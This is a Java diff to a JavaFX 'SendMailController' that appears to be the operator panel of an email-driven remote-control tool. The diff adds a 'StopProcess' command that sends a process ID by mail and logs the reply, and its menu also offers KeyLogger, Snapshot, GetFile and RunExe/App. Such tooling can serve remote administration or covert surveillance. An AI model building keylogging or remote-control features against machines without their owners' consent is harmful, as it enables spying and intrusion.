@@ -52,7 +52,7 @@ public class SendMailController {
 
     public void initialize() {
         List<String> list = List.of("Snapshot", "KeyLogger", "GetFile",
-                "ListDirectory", "ListProcess", "StopProcess", "OpenProcess", "Shutdown", "ListExe/App","RunExe/App");
+                "ListDirectory", "ListProcess", "StopProcess", "Shutdown", "ListExe/App","RunExe/App");
         comboBox.setItems(FXCollections.observableList(list));
         comboBox.getSelectionModel().selectFirst();
         addField.setEditable(false);
@@ -87,6 +87,12 @@ public class SendMailController {
                             addField.setDisable(true);
                             addField.setEditable(false);
                             labelAddField.setText("Nothing here");
+                            sendBut.setDisable(false);
+                        }
+                        case "StopProcess" -> {
+                            addField.setDisable(false);
+                            addField.setEditable(true);
+                            labelAddField.setText("Process'pid");
                             sendBut.setDisable(false);
                         }
                         case "ListDirectory" -> {
@@ -265,6 +271,38 @@ public class SendMailController {
                 });
                 thread.start();
             }
+            case "StopProcess" ->{
+                int id = random.nextInt(1000, 9999);
+                int tmp = id % 1000 % 100 % 10;
+                while (tmp > 3) tmp -= 3;
+                String coloruse = colorList.get(tmp);
+                sendBut.setDisable(true);
+                Thread thread = new Thread(()-> {
+                    try{
+                        System.out.println(Thread.currentThread().getName());
+                        String process = addField.getText();
+                        SendMail.getInstance().sendMail("req/"+id+"/ stopprocess/"+process);
+                        logText(emoji1 + "ID: " + id + " Send Mail Successfully! Wait for response!", coloruse);
+                        String a = CheckMail.getInstance().listen(id, 40);
+                        if (a != null) {
+                            if (a.equals("true"))
+                                logText(emoji1 + "Stop process Successfully", coloruse);
+                            else
+                                logText(emoji3+ "Can't stop process, pls check your pid " + a, coloruse);
+                        } else {
+                            logText(emoji3 + "ID: " + id + " Error happens", "red");
+                        }
+                    }catch (Exception e){
+                        Platform.runLater(() -> {
+                            sendBut.setDisable(false);
+                            logText("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - ", coloruse);
+                            comboBox.setDisable(false);
+                        });
+                    }
+                });
+                thread.start();
+            }
+
             case "ListDirectory" -> {
                 int id = random.nextInt(1000, 9999);
                 int tmp = id % 1000 % 100 % 10;
